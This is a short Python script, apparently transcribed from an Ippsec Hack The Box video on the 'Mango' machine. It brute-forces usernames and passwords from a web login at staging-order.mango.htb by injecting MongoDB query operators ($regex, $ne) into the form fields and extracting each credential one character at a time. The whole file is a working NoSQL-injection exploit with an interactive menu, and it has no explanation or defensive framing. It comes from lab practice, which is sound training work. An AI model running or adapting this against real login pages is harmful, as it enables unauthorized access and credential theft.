#
# Code from Ippsec Mango HTB YouTube Video
#
# Mango YouTube https://youtu.be/NO_lsfhQK_s
#

import requests
from cmd import Cmd



def inject(data):
    r = requests.post("http://staging-order.mango.htb/", data=data, allow_redirects=False)
    if r.status_code != 200:
        return True

def brute_user(user=""):
    secret  = user
    payload = ""
    while True:
        data = {"username[$regex]":"^" + payload + "$", "password[$ne]":"Ippsec", "login":"login"}
        if inject(data):
            print("") 
            break
        
        for i in range(97,122):
            payload = secret + chr(i)
            print("\r" + payload, flush=False, end='')
            data = {"username[$regex]":"^" + payload, "password[$ne]":"Ippsec", "login":"login"}        
            
            if inject(data):
                print("\r"  + payload, flush=True, end='')
                secret = secret + chr(i)
                break

    
def brute_password(user=""):
    secret  = ""
    payload = ""
    while True:
        data = {"username": user, "password[$regex]": "^" + payload + "$", "login":"login"}
        if inject(data):
            print("")        
            break

        for i in range(32,127):
            if (chr(i) in ['.','?','*','^','+','|','$']):
                backspace = "  "
                payload = secret + "\\" + chr(i)
            else:
                backspace = " "
                payload = secret + chr(i)
                
            print("\r" + payload + backspace, flush=False, end='')
            data = {"username": user, "password[$regex]": "^" + payload, "login":"login"}        
            
            if inject(data):
                print("\r"  + payload + backspace, flush=True, end='')
                secret = secret + chr(i)
                break



    
    
class Terminal(Cmd):
    intro = 'Bruteforcer for http://staging-order.mango.htb/  Type help or ? to list commands.\n'    
    
    def do_getuser(self, args):
        "Brute force username with optional starting string"
        brute_user(args)

    def do_getpassword(self, args):
        "Brute force password for specified username"        
        brute_password(args)


term = Terminal()
term.cmdloop()
        
            






